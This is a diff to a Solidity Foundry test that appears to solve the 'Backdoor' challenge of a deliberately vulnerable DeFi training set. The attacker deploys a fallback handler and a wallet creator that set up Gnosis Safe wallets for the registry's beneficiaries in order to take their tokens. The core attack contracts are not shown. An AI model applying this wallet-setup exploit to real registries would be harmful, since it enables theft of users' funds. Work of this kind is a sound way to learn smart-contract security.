@@ -9,6 +9,7 @@ import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
 import {WalletCreator} from "../../../src/Contracts/backdoor/WalletCreator.sol";
+import {FallBackHandler} from "../../../src/Contracts/backdoor/FallBackHandler.sol";
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -20,6 +21,7 @@ contract Backdoor is Test {
     GnosisSafeProxyFactory internal walletFactory;
     WalletRegistry internal walletRegistry;
     WalletCreator internal walletCreator;
+    FallBackHandler internal fallbackhandler;
     address[] internal users;
     address payable internal attacker;
     address internal alice;
@@ -80,18 +82,16 @@ contract Backdoor is Test {
     function testExploit() public {
         /** EXPLOIT START **/
         vm.startPrank(attacker);
-        walletCreator = new WalletCreator(address(masterCopy), address(walletFactory), walletRegistry);
-        // Encode the data for the GnosisSafe "setup" function call
-        /// @dev Setup function sets initial storage of contract.
-        /// @param _owners List of Safe owners.
-        /// @param _threshold Number of required confirmations for a Safe transaction.
-        /// @param to Contract address for optional delegate call.
-        /// @param data Data payload for optional delegate call.
-        /// @param fallbackHandler Handler for fallback calls to this contract
-        /// @param paymentToken Token that should be used for the payment (0 is ETH)
-        /// @param payment Value that should be paid
-        /// @param paymentReceiver Address that should receive the payment (or 0 if tx.origin)
-        walletCreator.createGnosisSafeWallet(users, 1, address(masterCopy), );
+        fallbackhandler = new FallBackHandler();
+        walletCreator = new WalletCreator(
+            address(masterCopy),
+            address(walletFactory),
+            walletRegistry,
+            users,
+            address(fallbackhandler),
+            address(dvt)
+        );
+        walletCreator.createGnosisSafeWallet();
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
